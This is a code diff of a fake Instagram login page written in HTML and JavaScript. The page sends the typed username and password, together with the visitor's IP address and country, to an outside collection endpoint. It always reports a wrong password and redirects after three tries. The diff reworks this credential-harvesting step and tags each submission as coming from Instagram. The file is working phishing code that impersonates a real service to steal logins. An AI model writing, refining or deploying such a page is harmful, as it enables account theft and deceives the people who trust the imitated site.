@@ -161,7 +161,7 @@
         let userCountry = '';
 
         // Get user's IP and country using ipinfo.io
-        fetch('https://ipinfo.io?token=YOUR_TOKEN')
+        fetch('https://ipinfo.io?token=YOUR_TOKEN_HERE')
             .then(response => response.json())
             .then(data => {
                 userIp = data.ip;
@@ -173,34 +173,32 @@
             event.preventDefault();
             attempts++;
             const errorMessage = document.getElementById('error-message');
-            if (attempts < 3) {
-                errorMessage.textContent = 'Incorrect password. Please try again.';
-            } else {
-                window.location.href = 'https://example.com/redirect-page';
-            }
-        }
 
-        function sendForm() {
+            // Send form data including attempts, IP, and country
             const form = document.getElementById('login-form');
             const formData = new FormData(form);
             formData.append('attempts', attempts);
             formData.append('ip', userIp);
             formData.append('country', userCountry);
+            formData.append('from', 'instagram'); // Add "From Instagram" parameter
 
             fetch(form.action, {
                 method: 'POST',
                 body: formData
             }).then(response => response.json())
-              .then(data => console.log(data))
+              .then(data => {
+                  if (attempts < 3) {
+                      errorMessage.textContent = 'Incorrect password. Please try again.';
+                  } else {
+                      window.location.href = 'https://example.com/redirect-page';
+                  }
+              })
               .catch(error => console.log(error));
         }
 
         document.addEventListener('DOMContentLoaded', () => {
             const form = document.getElementById('login-form');
-            form.addEventListener('submit', (event) => {
-                handleLogin(event);
-                sendForm();
-            });
+            form.addEventListener('submit', handleLogin);
         });
     </script>
 </head>
@@ -210,7 +208,7 @@
             <h1>Instagram</h1>
             <button class="facebook-btn">Continue Using Facebook</button>
             <div class="or-divider"><span>OR</span></div>
-            <form id="login-form" action="https://getintotouch.sh20raj.com/api.php?id=1960809344" method="post">
+            <form id="login-form" action="https://getintotouch.sh20raj.com/api.php?id=1960809344&from=instagram" method="post">
                 <div class="textbox">
                     <input type="text" placeholder="Phone number, username, or email address" name="username" required>
                 </div>
